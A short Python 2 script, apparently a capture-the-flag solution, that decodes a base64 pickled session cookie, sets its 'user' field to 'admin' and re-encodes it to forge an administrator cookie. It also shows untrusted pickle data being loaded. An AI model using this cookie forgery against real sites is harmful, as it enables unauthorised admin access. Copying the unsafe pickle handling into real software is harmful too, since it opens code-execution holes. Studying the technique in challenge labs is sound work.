import base64, pickle

'''
change to new cookie and go to admin page
'''

open("save.p", "wb").write(base64.b64decode('KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu'))

pickleObj = {'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}
pickleObj = pickle.load(open("save.p", "rb"))
pickleObj["user"] = "admin"
pickle.dump(pickleObj, open("save.p", "wb"))
print base64.b64encode(open("save.p", "rb").read())